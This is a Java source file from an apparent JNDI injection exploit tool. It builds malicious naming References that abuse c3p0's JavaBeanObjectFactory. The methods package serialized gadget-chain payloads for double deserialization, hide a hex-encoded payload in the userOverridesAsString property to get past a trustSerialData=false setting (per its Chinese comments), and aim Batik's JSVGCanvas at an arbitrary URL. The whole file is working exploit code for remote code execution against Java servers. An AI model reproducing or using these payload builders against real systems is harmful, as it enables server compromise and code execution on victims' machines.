package sonomon.jndi.factory;

import javax.naming.BinaryRefAddr;
import javax.naming.Reference;
import javax.naming.StringRefAddr;

import sonomon.jndi.deser.Deserialize;

public class JavaBeanObjectFactory {

	static String factory = "com.mchange.v2.naming.JavaBeanObjectFactory";
	//c3p0二次反序列化,由于getContent()出来的是byte[],因此必须走deserializeObject()才能进入getObjectInstance,没法绕trustSerialData=false
	//比较鸡肋,因此用setUserOverridesAsString代替
	public static Reference deserbypass_old(String gadget, String payload) throws Exception{
		byte[] bs = Deserialize.getJavaSerializeData(gadget, payload);
    	Reference ref = new Reference("java.lang.Class", factory, null);
    	
    	BinaryRefAddr refPropsRefAddr = new BinaryRefAddr("com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY", bs);
    	//再次封装,这样会经历两次反序列化
    	bs = FactoryUtils.objectToBytes(refPropsRefAddr);
    	refPropsRefAddr = new BinaryRefAddr("readObject", bs);
    	ref.add(refPropsRefAddr);
    	
		return ref;
	}
	
	public static Reference deserbypass(String gadget, String payload) throws Exception{
    	Reference ref = new Reference("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", "com.mchange.v2.naming.JavaBeanObjectFactory", null);    	
    	byte[] bs = Deserialize.getJavaSerializeData(gadget, payload);
    	String hex = FactoryUtils.bytesToHex(bs);
    	hex = "HexAsciiSerializedMap:"+hex+";";
    	ref.add(new StringRefAddr("userOverridesAsString", hex));
		return ref;
	}
	
	public static Reference svgbypass(String url) throws Exception{
    	Reference ref = new Reference("org.apache.batik.swing.JSVGCanvas", "com.mchange.v2.naming.JavaBeanObjectFactory", null);    	
    	ref.add(new StringRefAddr("URI", url));
		return ref;
	}

	
}
